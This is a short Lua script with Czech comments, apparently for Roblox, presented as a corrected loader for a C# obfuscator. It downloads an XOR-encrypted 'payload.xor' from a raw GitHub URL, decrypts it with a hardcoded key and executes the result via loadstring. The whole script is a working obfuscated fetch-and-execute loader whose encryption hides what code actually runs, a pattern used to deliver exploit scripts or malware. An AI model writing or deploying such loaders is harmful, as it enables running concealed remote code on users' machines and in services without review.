-- Opravený loader – správný XOR pro tvůj C# obfuscátor

local key = "aVysHSYBTqIuFaQW"   -- ← sem dej přesný klíč z C# (pokud byl random, spusť C# znovu a zkopíruj ho)

local function decrypt(data, key)
    local res = {}
    for i = 1, #data do
        local k = key:byte((i - 1) % #key + 1)
        local c = data:byte(i)
        local xored = bit32.bxor(c, k)          -- ← SPRÁVNÝ XOR (bit32.bxor)
        res[i] = string.char(bit32.band(xored, 0xFF))
    end
    return table.concat(res)
end

local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"

local Http = game:GetService("HttpService")
local success, encrypted = pcall(function()
    return Http:GetAsync(url)
end)

if not success then
    warn("Nepodařilo se stáhnout payload: " .. tostring(encrypted))
    return
end

local decoded = decrypt(encrypted, key)

local func, err = loadstring(decoded)
if not func then
    warn("loadstring selhal: " .. tostring(err))
    return
end

func()
